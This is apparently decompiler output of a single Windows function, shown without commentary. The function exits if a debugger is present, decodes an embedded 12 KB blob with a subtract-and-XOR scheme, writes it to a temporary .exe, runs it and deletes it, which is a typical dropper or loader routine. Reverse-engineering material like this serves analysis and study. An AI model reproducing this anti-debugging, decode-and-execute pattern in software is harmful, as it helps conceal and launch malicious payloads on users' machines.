void FUN_00401220(void)

{
  char cVar1;
  char cVar2;
  char cVar3;
  char cVar4;
  char cVar5;
  char cVar6;
  char cVar7;
  char cVar8;
  char cVar9;
  char cVar10;
  char cVar11;
  char cVar12;
  char cVar13;
  char cVar14;
  char cVar15;
  uint uVar16;
  BOOL BVar17;
  basic_ostream<char,struct_std::char_traits<char>_> *pbVar18;
  int iVar19;
  basic_streambuf<char,struct_std::char_traits<char>_> *this;
  int **in_FS_OFFSET;
  undefined *puVar20;
  char *_Buf;
  code *pcVar21;
  undefined4 uVar22;
  undefined *local_f8;
  basic_streambuf<char,struct_std::char_traits<char>_> local_f4 [4];
  basic_ostream<char,struct_std::char_traits<char>_> local_f0 [52];
  undefined4 local_bc;
  undefined local_b7;
  undefined4 local_b4;
  undefined4 local_b0;
  undefined local_ac;
  FILE *local_a8;
  basic_ios<char,struct_std::char_traits<char>_> local_90 [72];
  char local_48 [52];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_00403760;
  local_10 = *in_FS_OFFSET;
  uVar16 = DAT_00406008 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_14 = uVar16;
  BVar17 = IsDebuggerPresent();
  if (BVar17 != 0) {
    pcVar21 = FUN_004026e0;
    pbVar18 = (basic_ostream<char,struct_std::char_traits<char>_> *)
              FUN_004024a0(FUN_004026e0,uVar16);
    std::basic_ostream<char,struct_std::char_traits<char>_>::operator<<(pbVar18,pcVar21);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar19 = 0;
  do {
    cVar15 = *(char *)(iVar19 + 0x406019);
    cVar1 = *(char *)(iVar19 + 0x40601a);
    cVar2 = *(char *)(iVar19 + 0x40601b);
    cVar3 = *(char *)(iVar19 + 0x40601c);
    cVar4 = *(char *)(iVar19 + 0x40601d);
    cVar5 = *(char *)(iVar19 + 0x40601e);
    cVar6 = *(char *)(iVar19 + 0x40601f);
    cVar7 = *(char *)(iVar19 + 0x406020);
    cVar8 = *(char *)(iVar19 + 0x406021);
    cVar9 = *(char *)(iVar19 + 0x406022);
    cVar10 = *(char *)(iVar19 + 0x406023);
    cVar11 = *(char *)(iVar19 + 0x406024);
    cVar12 = *(char *)(iVar19 + 0x406025);
    cVar13 = *(char *)(iVar19 + 0x406026);
    cVar14 = *(char *)(iVar19 + 0x406027);
    (&DAT_00406018)[iVar19] = (&DAT_00406018)[iVar19] - 5 ^ 0x80;
    *(byte *)(iVar19 + 0x406019) = cVar15 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40601a) = cVar1 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40601b) = cVar2 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40601c) = cVar3 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40601d) = cVar4 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40601e) = cVar5 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40601f) = cVar6 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406020) = cVar7 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406021) = cVar8 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406022) = cVar9 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406023) = cVar10 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406024) = cVar11 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406025) = cVar12 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406026) = cVar13 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406027) = cVar14 - 5U ^ 0x80;
    cVar15 = *(char *)(iVar19 + 0x406029);
    cVar1 = *(char *)(iVar19 + 0x40602a);
    cVar2 = *(char *)(iVar19 + 0x40602b);
    cVar3 = *(char *)(iVar19 + 0x40602c);
    cVar4 = *(char *)(iVar19 + 0x40602d);
    cVar5 = *(char *)(iVar19 + 0x40602e);
    cVar6 = *(char *)(iVar19 + 0x40602f);
    cVar7 = *(char *)(iVar19 + 0x406030);
    cVar8 = *(char *)(iVar19 + 0x406031);
    cVar9 = *(char *)(iVar19 + 0x406032);
    cVar10 = *(char *)(iVar19 + 0x406033);
    cVar11 = *(char *)(iVar19 + 0x406034);
    cVar12 = *(char *)(iVar19 + 0x406035);
    cVar13 = *(char *)(iVar19 + 0x406036);
    cVar14 = *(char *)(iVar19 + 0x406037);
    (&DAT_00406028)[iVar19] = (&DAT_00406028)[iVar19] - 5 ^ 0x80;
    *(byte *)(iVar19 + 0x406029) = cVar15 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40602a) = cVar1 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40602b) = cVar2 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40602c) = cVar3 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40602d) = cVar4 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40602e) = cVar5 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40602f) = cVar6 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406030) = cVar7 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406031) = cVar8 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406032) = cVar9 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406033) = cVar10 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406034) = cVar11 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406035) = cVar12 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406036) = cVar13 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406037) = cVar14 - 5U ^ 0x80;
    cVar15 = *(char *)(iVar19 + 0x406039);
    cVar1 = *(char *)(iVar19 + 0x40603a);
    cVar2 = *(char *)(iVar19 + 0x40603b);
    cVar3 = *(char *)(iVar19 + 0x40603c);
    cVar4 = *(char *)(iVar19 + 0x40603d);
    cVar5 = *(char *)(iVar19 + 0x40603e);
    cVar6 = *(char *)(iVar19 + 0x40603f);
    cVar7 = *(char *)(iVar19 + 0x406040);
    cVar8 = *(char *)(iVar19 + 0x406041);
    cVar9 = *(char *)(iVar19 + 0x406042);
    cVar10 = *(char *)(iVar19 + 0x406043);
    cVar11 = *(char *)(iVar19 + 0x406044);
    cVar12 = *(char *)(iVar19 + 0x406045);
    cVar13 = *(char *)(iVar19 + 0x406046);
    cVar14 = *(char *)(iVar19 + 0x406047);
    (&DAT_00406038)[iVar19] = (&DAT_00406038)[iVar19] - 5 ^ 0x80;
    *(byte *)(iVar19 + 0x406039) = cVar15 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40603a) = cVar1 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40603b) = cVar2 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40603c) = cVar3 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40603d) = cVar4 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40603e) = cVar5 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40603f) = cVar6 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406040) = cVar7 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406041) = cVar8 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406042) = cVar9 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406043) = cVar10 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406044) = cVar11 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406045) = cVar12 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406046) = cVar13 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406047) = cVar14 - 5U ^ 0x80;
    cVar15 = *(char *)(iVar19 + 0x406049);
    cVar1 = *(char *)(iVar19 + 0x40604a);
    cVar2 = *(char *)(iVar19 + 0x40604b);
    cVar3 = *(char *)(iVar19 + 0x40604c);
    cVar4 = *(char *)(iVar19 + 0x40604d);
    cVar5 = *(char *)(iVar19 + 0x40604e);
    cVar6 = *(char *)(iVar19 + 0x40604f);
    cVar7 = *(char *)(iVar19 + 0x406050);
    cVar8 = *(char *)(iVar19 + 0x406051);
    cVar9 = *(char *)(iVar19 + 0x406052);
    cVar10 = *(char *)(iVar19 + 0x406053);
    cVar11 = *(char *)(iVar19 + 0x406054);
    cVar12 = *(char *)(iVar19 + 0x406055);
    cVar13 = *(char *)(iVar19 + 0x406056);
    cVar14 = *(char *)(iVar19 + 0x406057);
    (&DAT_00406048)[iVar19] = (&DAT_00406048)[iVar19] - 5 ^ 0x80;
    *(byte *)(iVar19 + 0x406049) = cVar15 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40604a) = cVar1 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40604b) = cVar2 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40604c) = cVar3 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40604d) = cVar4 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40604e) = cVar5 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x40604f) = cVar6 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406050) = cVar7 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406051) = cVar8 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406052) = cVar9 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406053) = cVar10 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406054) = cVar11 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406055) = cVar12 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406056) = cVar13 - 5U ^ 0x80;
    *(byte *)(iVar19 + 0x406057) = cVar14 - 5U ^ 0x80;
    iVar19 = iVar19 + 0x40;
  } while (iVar19 < 0x3000);
  _Buf = local_48;
  uVar22 = 0x32;
  tmpnam_s(_Buf,0x32);
  puVar20 = &DAT_004042b0;
  strcat_s(local_48,0x32,".exe");
  memset(&local_f8,0,0xb0);
  FUN_00402050(local_48,puVar20,_Buf,uVar22);
  local_8 = 0;
  std::basic_ostream<char,struct_std::char_traits<char>_>::write
            ((basic_ostream<char,struct_std::char_traits<char>_> *)&local_f8,&DAT_00406018,0x3000);
  this = local_f4;
  if (local_a8 == (FILE *)0x0) {
    local_ac = 0;
    local_b7 = 0;
    std::basic_streambuf<char,struct_std::char_traits<char>_>::_Init(this);
  }
  else {
    cVar15 = FUN_00402380();
    if (cVar15 == '\0') {
      this = (basic_streambuf<char,struct_std::char_traits<char>_> *)0x0;
    }
    iVar19 = fclose(local_a8);
    local_ac = 0;
    local_b7 = 0;
    if (iVar19 != 0) {
      this = (basic_streambuf<char,struct_std::char_traits<char>_> *)0x0;
    }
    std::basic_streambuf<char,struct_std::char_traits<char>_>::_Init(local_f4);
    local_b4 = DAT_00409588;
    local_a8 = (FILE *)0x0;
    local_b0 = DAT_0040958c;
    local_bc = 0;
    if (this != (basic_streambuf<char,struct_std::char_traits<char>_> *)0x0) goto LAB_00401427;
  }
  local_a8 = (FILE *)0x0;
  local_bc = 0;
  local_b4 = DAT_00409588;
  local_b0 = DAT_0040958c;
  std::basic_ios<char,struct_std::char_traits<char>_>::setstate
            ((basic_ios<char,struct_std::char_traits<char>_> *)
             (local_f4 + *(int *)(local_f8 + 4) + -4),2,false);
LAB_00401427:
  system(local_48);
  remove(local_48);
  pcVar21 = FUN_004026e0;
  pbVar18 = (basic_ostream<char,struct_std::char_traits<char>_> *)FUN_004024a0();
  std::basic_ostream<char,struct_std::char_traits<char>_>::operator<<(pbVar18,pcVar21);
  std::basic_istream<char,struct_std::char_traits<char>_>::ignore
            ((basic_istream<char,struct_std::char_traits<char>_> *)cin_exref,1,-1);
  *(undefined ***)(local_f4 + *(int *)(local_f8 + 4) + -4) =
       std::basic_ofstream<char,struct_std::char_traits<char>_>::vftable;
  *(int *)(local_f0 + *(int *)(local_f8 + 4) + -0xc) = *(int *)(local_f8 + 4) + -0x68;
  FUN_00401f90();
  std::basic_ostream<char,struct_std::char_traits<char>_>::
  ~basic_ostream<char,struct_std::char_traits<char>_>(local_f0);
  std::basic_ios<char,struct_std::char_traits<char>_>::
  ~basic_ios<char,struct_std::char_traits<char>_>(local_90);
  *in_FS_OFFSET = local_10;
  FUN_004029df();
  return;
}
